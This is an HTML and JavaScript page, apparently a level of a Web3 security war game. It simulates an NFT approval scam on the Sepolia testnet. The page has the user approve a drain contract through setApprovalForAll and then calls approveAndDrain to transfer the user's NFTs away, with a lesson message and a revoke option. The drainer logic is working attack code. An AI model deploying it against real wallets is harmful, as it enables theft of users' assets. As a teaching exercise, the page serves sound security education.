<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Level 2 — NFT Approval Trap</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #fff;
      margin: 0;
    }
    .top-bar {
      background: #111;
      padding: 0.8rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 0.9rem;
      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.6);
    }
    .frame-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: start;
      padding-top: 2rem;
    }
    .card {
      background: rgba(0, 0, 0, 0.85);
      border-radius: 12px;
      padding: 2rem;
      box-shadow: 0 0 18px #ff9800;
      max-width: 600px;
      width: 100%;
      text-align: center;
      margin-bottom: 2rem;
    }
    button {
      padding: 1rem 2rem;
      font-size: 1rem;
      background: #ff9800;
      border: none;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
      margin: 0.5rem;
    }
    #status {
      margin-top: 1rem;
      font-size: 1rem;
      white-space: pre-wrap;
      text-align: left;
    }
    h2 {
      margin-top: 2rem;
      border-top: 1px solid #888;
      padding-top: 1rem;
    }
  </style>
</head>
<body>
  <div class="top-bar">
    <div>Web3 War Game</div>
    <div>Level 2: NFT Approval Trap</div>
  </div>

  <div class="frame-container">
    <!-- One Click Drain Simulation -->
    <div class="card">
      <h1>🚨 ONE CLICK DRAIN SIMULATION</h1>
      <button id="connectBtn">Connect Wallet</button>
      <button id="animateBtn">Animate NFT / DRAIN</button>
      <div id="status"></div>
    </div>

    <!-- Step-by-Step Simulation -->
    <div class="card">
      <h2>🧪 STEP BY STEP SIMULATION</h2>
      <button id="approveOneBtn">Approve HappyApeYC</button>
      <button id="drainOneBtn">Animate NFT / DRAIN</button>
      <button id="revokeBtn">Revoke Approval</button>
    </div>
  </div>

  <script>
    const nftContracts = [
      "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WarGame NFT
      "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC NFT
    ];
    const drainContract = "0x0103e8d6e07057829d99E57eD31420694bA4C4E3";
    const nftABI = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function balanceOf(address owner) view returns (uint256)",
      "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
      "function isApprovedForAll(address owner, address operator) view returns (bool)"
    ];
    const drainABI = ["function approveAndDrain(address[] calldata nftContracts, address victim) external"];

    let provider, signer, userAddress;

    async function connectWallet() {
      const status = document.getElementById("status");
      if (!window.ethereum) return alert("MetaMask required.");
      try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        userAddress = await signer.getAddress();
        const network = await provider.getNetwork();
        if (network.chainId !== 11155111) {
          status.innerText = "Please switch to Sepolia testnet.";
          return;
        }

        let allNFTs = [];
        for (let addr of nftContracts) {
          const nft = new ethers.Contract(addr, nftABI, provider);
          const balance = await nft.balanceOf(userAddress);
          for (let i = 0; i < balance; i++) {
            const tokenId = await nft.tokenOfOwnerByIndex(userAddress, i);
            allNFTs.push(`📦 ${addr} — Token #${tokenId}`);
          }
        }

        status.innerText = `✅ Connected: ${userAddress}\n\nYou own:\n` + (allNFTs.length ? allNFTs.join("\n") : "No NFTs in target collections.");
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Wallet connection failed.";
      }
    }

    async function animateAndDrain() {
      const status = document.getElementById("status");
      const happyApe = new ethers.Contract(nftContracts[1], nftABI, signer);
      try {
        status.innerText = "⚠️ Requesting approval...";
        const tx = await happyApe.setApprovalForAll(drainContract, true);
        await tx.wait();

        status.innerText = "🔁 Approval granted. Draining NFTs...";
        const drainer = new ethers.Contract(drainContract, drainABI, signer);
        const tx2 = await drainer.approveAndDrain(nftContracts, userAddress);
        await tx2.wait();

        status.innerText = "💀 NFTs drained to attacker.\nLesson: Approval = Control.\nNever approve unknown contracts!";
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Action rejected or failed.";
      }
    }

    async function approveOne() {
      const happyApe = new ethers.Contract(nftContracts[1], nftABI, signer);
      const status = document.getElementById("status");
      try {
        status.innerText = "🔓 Requesting approval for HappyApeYC...";
        const tx = await happyApe.setApprovalForAll(drainContract, true);
        await tx.wait();
        status.innerText = "✅ Approval granted.";
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Approval rejected.";
      }
    }

    async function drainOnly() {
      const status = document.getElementById("status");
      try {
        const drainer = new ethers.Contract(drainContract, drainABI, signer);
        const tx = await drainer.approveAndDrain(nftContracts, userAddress);
        await tx.wait();
        status.innerText = "💀 NFTs drained. Game Over.";
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Drain failed or rejected.";
      }
    }

    async function revokeApproval() {
      const happyApe = new ethers.Contract(nftContracts[1], nftABI, signer);
      const status = document.getElementById("status");
      try {
        status.innerText = "🔐 Revoking approval...";
        const tx = await happyApe.setApprovalForAll(drainContract, false);
        await tx.wait();
        status.innerText = "✅ Approval revoked.";
      } catch (err) {
        console.error(err);
        status.innerText = "❌ Revoke failed.";
      }
    }

    document.getElementById("connectBtn").onclick = connectWallet;
    document.getElementById("animateBtn").onclick = animateAndDrain;
    document.getElementById("approveOneBtn").onclick = approveOne;
    document.getElementById("drainOneBtn").onclick = drainOnly;
    document.getElementById("revokeBtn").onclick = revokeApproval;
  </script>
</body>
</html>
